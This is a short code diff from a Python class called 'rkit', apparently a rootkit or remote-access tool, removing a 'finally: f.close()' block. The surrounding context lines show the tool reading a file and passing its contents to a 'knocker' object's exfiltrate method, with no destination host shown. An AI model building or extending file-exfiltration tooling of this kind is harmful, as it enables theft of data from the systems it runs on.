@@ -81,8 +81,6 @@ class rkit:
             self.knocker.exfiltrate(data, file_name)
         except FileNotFoundError:
             self.knocker.exfiltrate("File " + file + " not found", "/")
-        finally:
-            f.close()
         return "file"
 
 
